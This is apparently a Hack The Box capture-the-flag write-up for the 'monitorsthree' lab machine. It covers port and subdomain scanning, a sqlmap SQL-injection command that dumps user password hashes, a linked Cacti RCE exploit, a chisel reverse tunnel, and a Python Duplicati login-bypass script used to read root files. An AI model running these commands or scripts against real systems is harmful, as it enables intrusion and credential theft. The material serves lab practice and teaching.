---
layout: post
title: HTB - monitorsthree
date: 2025-02-26 11:42 -0400
---

![monitorsthree](/assets/img/monitorsthree.png)

## nmap
```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-25 10:55 -04
Nmap scan report for 10.10.11.30
Host is up (0.16s latency).

PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 86f87d6f4291bb897291af72f301ff5b (ECDSA)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8084/tcp filtered websnp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-25 10:55 -04
Warning: 10.10.11.30 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.30
Host is up (0.17s latency).
All 65535 scanned ports on 10.10.11.30 are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)

Nmap done: 1 IP address (1 host up) scanned in 73.27 seconds
```

## subdomain bruteforce
```
~/workspace/projects/htb/monitorsthree » ffuf -u http://$(cat ip.txt)/ -H 'Host: FUZZ.monitorsthree.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.30/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.monitorsthree.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: all
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 162ms]
| URL | http://10.10.11.30/
| --> | /cacti
    * FUZZ: cacti
```

- `monitorsthree.htb`
- `cacti.monitorsthree.htb`

### monitorsthree.htb
![main website](/assets/img/monitorsthree1.png)

This seems to be a simple webpage with a login. 

There is an sql injection on the forgot password page.

![main website sqli](/assets/img/monitorsthree4.png)

sqlmap can exploit it without tweaks:
`sqlmap -r request.txt -p username --dbms=mysql --threads 10 --sql-shell`

A couple of users found:
```bash
[*] David Thompson,Database Manager,1982-11-23,dthompson@monitorsthree.htb,5,633b683cc128fe244b00f176c8a950f5,83000.00,2022-09-15,mwatson
[*] Jennifer Anderson,Network Engineer,1990-07-30,janderson@monitorsthree.htb,6,1e68b6eb86b45f6d92f8f292428f77ac,68000.00,2021-06-20,janderson
[*] Marcus Higgins,Super User,1978-04-25,admin@monitorsthree.htb,2,31a181c8372e3afc59dab863430610e8,320800.00,2021-01-12,admin
[*] Michael Watson,Website Administrator,1985-02-15,mwatson@monitorsthree.htb,7,c585d01f2eb3e6e1073e92023088a3dd,75000.00,2021-05-10,dthompson
```

Crackstation founds the password for admin

![main website sqli](/assets/img/monitorsthree10.png)

The dashboard doesnt seem to have anything interesting. Lets try the credentials on cacti.

![main website dashboard](/assets/img/monitorsthree11.png)

It works. The ui shows version `1.2.26` seems to be vulnerable to CVE-2024-25641 and there is a poc for it [CVE-2024-25641](https://github.com/5ma1l/CVE-2024-25641)

![cacti rce](/assets/img/monitorsthree2.png)

# priv esc
## interesting stuff on /opt
```bash
www-data@monitorsthree:~/html/cacti/resource$ ls /opt
ls /opt
backups
containerd
docker-compose.yml
duplicati
```

"Duplicati is a free, open-source backup solution that offers zero-trust, fully encrypted backups for your data.". It can be accessed at port 8200. Let's use chisel to forward it.

- server (host):
    - chisel server -p 8000 --reverse
- client (box):
    - ./chisel client 10.10.14.37:8000 R:8200:127.0.0.1:8200

![duplicati](/assets/img/monitorsthree7.png)

Seems to be version `2.0.8.1` according to the html.
![duplicati version](/assets/img/monitorsthree12.png)

And there is an [auth bypass](https://read.martiandefense.llc/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee) for it online.

POC based on the article:
```python
import requests
import base64
import hashlib

server_pass = base64.b64decode("SERVER_PASSWORD")

with requests.Session() as ses:
    burp0_url = "http://0.0.0.0:8200/login.cgi"
    burp0_headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
    burp0_data = {"get-nonce": "1"}
    res = ses.post(burp0_url, headers=burp0_headers, data=burp0_data)
    nonce = base64.b64decode(res.json()["Nonce"])

    out = base64.b64encode(hashlib.sha256(nonce + server_pass).digest())

    burp0_url = "http://0.0.0.0:8200/login.cgi"
    burp0_headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
    burp0_data = {"password": out}
    ses.post(burp0_url, headers=burp0_headers, data=burp0_data)
    print(f"{ses.cookies.get('session-auth')}")
```

![duplicati](/assets/img/monitorsthree6.png)

The backup runs inside a Mono runtime. That way its isolated from the host.
But the dockerfile mounts `/` to `/source`. So every file on host is available inside the container.
```yaml
volumes:
  - /opt/duplicati/config:/config
  - /:/source
```

We can then just choose to backup the root and user flag and select the output location.

![duplicati](/assets/img/monitorsthree13.png)
![duplicati](/assets/img/monitorsthree9.png)
![duplicati](/assets/img/monitorsthree3.png)

```bash
www-data@monitorsthree:/tmp/123$ cat ./home/marcus/user.txt
ff150***************************

www-data@monitorsthree:/tmp/123$ cat ./root/root.txt
caaa2***************************
```
